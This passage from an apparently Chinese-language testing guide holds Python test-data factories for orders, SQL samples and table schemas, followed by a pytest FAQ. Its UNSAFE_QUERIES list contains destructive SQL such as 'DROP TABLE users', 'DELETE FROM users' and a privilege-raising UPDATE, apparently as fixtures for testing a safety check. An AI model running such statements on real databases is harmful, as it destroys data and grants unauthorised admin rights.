    """订单测试数据工厂 (L-4)"""

    @staticmethod
    def create(
        user_id: int,
        amount: Optional[float] = None,
        status: str = "pending"
    ) -> dict:
        """创建订单数据"""
        return {
            "user_id": user_id,
            "amount": amount or round(fake.pyfloat(min_value=10, max_value=1000), 2),
            "status": status,
            "created_at": fake.date_time_between(start_date="-6M", end_date="now")
        }

    @staticmethod
    def create_batch(user_id: int, count: int, **kwargs) -> list[dict]:
        """批量创建订单数据"""
        return [OrderFactory.create(user_id, **kwargs) for _ in range(count)]


class SQLSampleFactory:
    """SQL 样例工厂 (L-4)"""

    VALID_QUERIES = [
        "SELECT * FROM users",
        "SELECT id, name FROM users WHERE status = 'active'",
        "SELECT COUNT(*) FROM orders GROUP BY user_id",
        "SELECT u.name, SUM(o.amount) FROM users u JOIN orders o ON u.id = o.user_id GROUP BY u.name",
    ]

    INVALID_QUERIES = [
        "SELEC * FROM users",
        "SELECT * FORM users",
        "SELECT * FROM",
    ]

    UNSAFE_QUERIES = [
        "DROP TABLE users",
        "DELETE FROM users",
        "UPDATE users SET role = 'admin'",
        "INSERT INTO users (name) VALUES ('hacked')",
    ]

    @classmethod
    def valid_query(cls) -> str:
        """获取随机有效查询"""
        return random.choice(cls.VALID_QUERIES)

    @classmethod
    def invalid_query(cls) -> str:
        """获取随机无效查询"""
        return random.choice(cls.INVALID_QUERIES)

    @classmethod
    def unsafe_query(cls) -> str:
        """获取随机不安全查询"""
        return random.choice(cls.UNSAFE_QUERIES)


class SchemaFactory:
    """Schema 测试数据工厂 (L-4)"""

    @staticmethod
    def create_table_info(
        name: str,
        column_count: int = 3,
        has_primary_key: bool = True
    ) -> dict:
        """创建表信息"""
        columns = []

        if has_primary_key:
            columns.append({
                "name": "id",
                "data_type": "integer",
                "is_primary_key": True,
                "is_nullable": False
            })

        for i in range(column_count - (1 if has_primary_key else 0)):
            columns.append({
                "name": fake.word().lower(),
                "data_type": random.choice(["varchar(255)", "integer", "boolean", "timestamp"]),
                "is_primary_key": False,
                "is_nullable": random.choice([True, False])
            })

        return {
            "name": name,
            "schema_name": "public",
            "columns": columns,
            "indexes": [],
            "row_count_estimate": random.randint(0, 10000)
        }


# 便捷函数
def create_user(**kwargs) -> dict:
    return UserFactory.create(**kwargs)


def create_order(user_id: int, **kwargs) -> dict:
    return OrderFactory.create(user_id, **kwargs)


def create_users(count: int, **kwargs) -> list[dict]:
    return UserFactory.create_batch(count, **kwargs)
```

### 10.2 常见问题

**Q: 如何跳过需要 Docker 的测试?**
```bash
uv run pytest -m "not slow"
```

**Q: 如何只运行特定模块的测试?**
```bash
uv run pytest tests/unit/test_sql_parser.py -v
```

**Q: 如何调试失败的测试?**
```bash
uv run pytest tests/path/to/test.py -v --pdb
```
